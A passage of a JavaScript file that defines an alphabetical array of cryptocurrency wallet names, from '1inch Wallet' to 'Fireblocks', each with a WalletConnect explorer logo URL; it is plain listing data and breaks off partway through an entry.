const wallets = [
    {
        "name": "1inch Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/3e60118c-b9a9-43df-7975-33ebc8014400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "37x",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c85a6bf2-f505-481c-9e7d-9a7190042c00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "3mint",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/3143a461-002d-4e49-b0f7-32f58ec6b700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "3S Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f3b6a89d-ec8f-49dc-e07f-6bf723e1e500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "ABC Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/e689ea2b-cd49-4a1d-7812-424a0e0d9200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Abra Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2219db01-e0c9-471c-5def-fd3b4e7a7a00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Absolute Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/03797059-fc49-4adc-7b93-503290b62300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Abstract",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/1ed092f7-0a74-4856-bc0a-02660223f400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "ABWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c2cb1d47-305e-45da-cdb8-b55b73ea4300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "ADF Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/28acc8ed-a0e7-4004-1968-c54869fa2100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "AirGap Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/76bfe8cd-cf3f-4341-c33c-60da01065000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Aktionariat",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/6d18e8ea-b536-4038-c5bf-94a499d5a400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Alephium Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/3ece76f1-fc71-4fad-2d28-707f5a8d2300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Alicebob Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/15be8ddd-0bef-4948-56d1-6101347a6b00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "AlphaWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/5b1cddfb-056e-4e78-029a-54de5d70c500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Ammer Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7d38dd8e-92ee-44bf-1ca4-818531de1900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Ape Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/ea66f627-cc46-41c4-8287-dae2f379f700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "ApolloX",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/80ab63a2-1b32-4140-3577-9fbc8ea82e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Arculus Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f78dab27-7165-4a3d-fdb1-fcff06c0a700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Argent",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/215158d2-614b-49c9-410f-77aa661c3900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Arianee Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/13b7fe36-909a-4c83-4f06-5740829a3900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Armana Portal",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/fe3c264d-b595-437d-e5f9-5e5833dd4300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "AT.Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/98bd3b9a-097e-4743-8808-986b4ad1ad00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Atomic Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7eca0311-abf5-4902-43e9-51858403e200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "ATON",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2e85f1d1-f498-4cae-bb54-1d40614ee300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Aurora Pass",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/6d93eeba-edce-431c-4293-e25784e61f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Avacus",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a7106965-91cc-4a73-4688-c5c72ae0ed00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "AZCoiner",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c6601184-7eb7-46c9-f6ad-0808cfd16100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Backpack",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/71ca9daf-a31e-4d2a-fd01-f5dc2dc66900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Ballet Crypto",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/fd46e96d-350d-4922-a4a9-b2bfe7c92400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "BankSocial ",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/159ae656-ae24-4717-f78f-f84eb2b2e700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Base (formerly Coinbase Wallet)",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/04c88bf0-f115-4686-8c29-90a3d018a400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "BC Vault",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/56995d82-a980-4dfc-2611-0f91d88c5700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "BCERTin wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/e321346d-5ce7-4e75-371e-e4f0bf923900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "BeanBag",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/5fad49d2-a138-47bb-ac87-6368d8bd9000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Bee Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f90bc33f-f085-40cf-7538-fae5ae84f900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "BeeWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/77743ed9-5ac6-48f7-867d-0f98e481b500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Beexo",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7074bf0c-d0f7-4d86-2dc4-28430d629d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "BeraSig",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/4b9e9716-c86d-4f1e-4bcc-12af74af7400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Best Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7f9574ed-eb42-4e04-0888-be2939936700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Bettatrade",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/938053f6-6e81-4d58-4033-8ae8625e5f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "BharatBox App",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/8bef836e-9d6a-4318-ebda-930c39246300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Bifrost Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/27c999c6-3492-4161-bbb8-1b75bdb97500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "BIM Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/dae5a6bb-ac44-4d75-8c25-a361801d3b00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Binance Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/ebac7b39-688c-41e3-7912-a4fefba74600?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Binance Wallet (Bitcoin)",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/ebac7b39-688c-41e3-7912-a4fefba74600?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Binance.US",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/48aa1a7d-c5fe-4ad6-c2f2-e5684b296900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "BitBox",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/e8373489-de33-4d1f-ffdf-1c435a050e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Bitcoin.com Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/b567c9d7-bd3f-4184-0dc8-297a0e44de00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "BitDog Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/9b2d118f-1de7-4742-bdcc-cac8d1557100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Bitget Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2b569b7f-e6c6-4faa-8e5a-ecd4dec8cf00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Bitget Wallet Lite",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/3d02c83a-19ac-4552-da5a-c4adc2523b00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Bitizen",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/75dd1471-77e9-4811-ce57-ec8fc980ec00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "BitPay Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/553e8fff-37c9-4a62-5bfe-02ff22e1e200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Bitpie",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/e6dce4ec-a1a8-49e6-d8e1-8329fdd5c700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Bitso Web3 Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7e4953fb-de22-4761-1ff6-8c494549aa00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Bitwinex",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2fc793ee-4c3a-4d84-85a1-3f9ff98ece00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "BlackFort Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f2cf0909-3e1e-4f67-8c3f-2b69f7a5eb00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Blade Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/8fa87652-b043-4992-3a45-78e438d1cd00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Blanq",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d02dcb81-d279-4414-627a-681dcad51200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Blazpay",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/ba0ed3d1-e94c-408d-c8f5-a384edcba700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Blockchain.com",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/6f913b80-86c0-46f9-61ca-cc90a1805900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "BlockWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/ef825629-9828-4a5a-b376-62ab4ee81f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Blocto",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/374258d3-c749-4f37-7815-77e61f798c00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Bloom",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/185c0388-58f4-408c-45af-71c9ca114300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "BMA Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/5d8240f7-1d58-4ada-12b3-0b5e7d5b1300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Bonuz Social Smart Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/eb376138-c5b9-4d82-c610-c98c9c218a00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Brave Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/8cecad66-73e3-46ee-f45f-01503c032f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Bridge Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/20c3072e-c92e-4902-d4b9-cb2b6ab29100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "BSC Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/63fe9162-b352-4a2c-1da1-a31d48008e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Burrito",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7eec7187-3f48-4fda-53bb-b0ad55749a00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "BUZZUP",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/fb24f0a3-83f5-43e7-2204-25c6348f0000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Bybit Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/b9e64f74-0176-44fd-c603-673a45ed5b00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "ByteBank",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/bc7aacd6-b2e2-4146-7d21-06e0c5d44f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Caesium",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/b3a456db-43c7-463c-cc3c-8c550c5b9500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Cake Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/b05af25b-fa4d-4f91-a4cb-2f8f7d544000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Callback",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/9f50c7a7-2384-4efe-89c3-01e0fec2b700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "campux.digital",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a635b65a-44b9-4dfa-a28f-83128d8dff00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Catecoin Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d017bc54-db4d-4f07-2de2-69790ce92400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Certhis",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/fbd441cc-e861-46dc-48ae-a04228ddb500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Chain",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f9f3d8da-e791-47d2-98c2-031712617e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Clave",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f1c538df-15d9-4448-542f-b7b358e95d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "clear-wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a6d4c2de-1bd9-404f-f3d2-3d2ed9bf5000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Cling Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2d8006c3-852b-458a-d6b0-916c5ba76800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Cobalt Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/29d914e5-9daa-4342-33cd-169155c5a600?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "COCA Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/16e75893-aee7-4884-2267-b561fb031d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Cogni ",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/b650cd08-21eb-4769-8ef9-96feb6e38e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Coin Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f550bcb1-72a9-4e00-268e-3e543a23b600?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Coin98 Super Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/e7c6d5d0-b986-4348-de22-fc940e1aee00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "CoinCircle",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/eae63a23-c7ba-4f7e-24b3-e6fc69215d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "CoinEx Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/67650667-cc52-4e7f-2d4b-26fcdb160100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Coininn Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/52efd5a7-65fa-428d-668c-f53ceb4b5f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Coinomi",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/3b446d16-a908-40c8-5835-9a6efe90dd00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "CoinStats",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/b2a00908-f144-4a49-cc0a-9d7422ad5e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Cold Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/fa63c977-9637-4d85-960d-058da23e4300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Compass Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/1d7dea00-96be-4ce8-ca15-d14bddbb5000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Competence.id",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/ac1de66e-a82c-4cc5-f460-86b640e56500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Concordium",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/b1ca907e-2f5f-42a8-d11c-86a15a291600?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "CoolWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f581365d-e844-4d21-8e35-44a755a32d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Core",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/aec2da5c-8867-4a53-8f3d-4d547a30b400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Cosmostation",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/ea26c3c8-adb6-4dc4-ee02-35d6eee02800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Credit Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/cf606650-415f-4e7f-a45d-fd6b16769400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Crossmint",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/8ad627ec-cbcd-4878-ec5c-3df588055200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Cryptnox Bridge",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/5cbfc263-dd0d-4978-d455-3c0b0ed52900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Cryptnox Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2947b7c8-8966-4485-a98d-25fe43c16700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Crypto.com Onchain",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/88388eb4-4471-4e72-c4b4-852d496fea00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Cryptokara",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/028ef53f-b5d9-4a63-2bf0-d384c8522500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Ctrl Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/749856b0-3f0e-4876-4d0f-27835310db00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "CVL Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/e4eff15a-35d5-49fe-047f-33e331f46400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "CyberWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/24887576-8e74-4518-36b3-3c5e13f11a00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Cypher Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7bce0965-a4cc-4aad-6217-009d51017500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Cypherock cySync",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7fd5a23a-3a01-4cfb-3c8b-9f43ae414400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "D'CENT Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/e7e60788-6806-47d4-7b4a-a410e7aa3300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "DaffiOne",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/1e87bcb9-452c-4ad7-471c-130ae0115000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Daily Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/8b54bbc5-5d39-4251-9b69-cde070bbd000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Dawn Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/dcb4a287-a6f5-4e81-cbab-2d0eb27b2f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Deficloud",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f67d45d0-dbeb-4d00-3c3a-51a91bedc100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "DexTrade",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d33237c0-a4e1-4339-9db8-a1087311c400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Dfinn Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/9a9c59ce-6346-4af8-db19-778533fb6000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "DGG Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/e4cbed08-8839-4bce-875f-d8917ceb7e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "DGPub App",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/9d9a2700-4ab0-4c1c-4acf-8ed0037cc500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "DIDWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/bc66fa57-46f4-4e17-6cb7-5f2d9af9c000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Digital Shield",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/020fe815-8a77-4a7b-b292-b69372e12500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "DMToken",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/cd19f4a5-9390-4801-7587-233a3bf1d800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Dohrnii Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/1bb51ed9-68ed-4012-3082-72dcb7754300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Dokwallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/5707f35e-17a1-42b3-35c5-664f7655cd00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Dollet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/21679e58-e829-44f6-78d3-6a9d6e9ce900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "DOSI Vault",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/0a0d223e-6bf7-4e12-a5b4-1720deb02000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Dropmate",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/bf19fe4b-d712-45e8-95f2-b7be36e4c400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Dropp",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/526fb7ea-d0da-482a-ac84-7e38afea1700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "DS Security SA",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/149a10a6-8914-44ea-424a-236017890100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "DTTD",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/4a1da9d0-1a81-4e51-4758-b2157f4e6000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Dynamic",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/dd88a74e-593c-4f6e-a945-1199851de800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Earth Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d3f724c4-f99b-476f-10f8-12aa4af13800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "EASY",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/62feb41a-be1f-4b1c-e089-27f97c0e8d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Echooo Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a7b1de20-bafd-4ab9-c31d-7d398cc90a00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "ECOIN Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/9639c263-d590-4862-ba9f-d5c7c1878d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Edge",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f0261e29-4981-4e16-4441-165e2d5d6300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "ELLIPAL",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/0a5b45a1-c974-4f41-6c14-376714478c00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Enjin Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/add9626b-a5fa-4c12-178c-e5584e6dcd00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Enkrypt",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/5aafd680-95a8-41e6-6df0-632ea23f4700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Essentials",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/058878f4-7364-4e01-434f-2cc09a15cf00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "eth-q1",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/027f3d70-61ad-43d7-6c77-da305bf64500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "EtherMail",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7f3205c6-6051-4cdb-8ef8-84334a7c7f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Ethos Self-Custody Vault",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/8bc7fb62-6f6b-4473-2e4a-5691a646fc00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Everspace",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/80eaa630-6392-4b0a-a604-0a0f808e4d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Exodus",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/4c16cad4-cac9-4643-6726-c696efaf5200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Facewallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/51ab77a7-8df7-4217-ad98-b313cfbbe700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Family",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/18ba1b99-6268-4d7e-bead-260e978b1a00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "FinoaConnect",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/b7a0c6fe-10bd-423c-6aa5-0637bd2b9900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "FINTOKEN",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/420ababa-3c29-4711-4487-84b93bfa5900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Fireblocks",
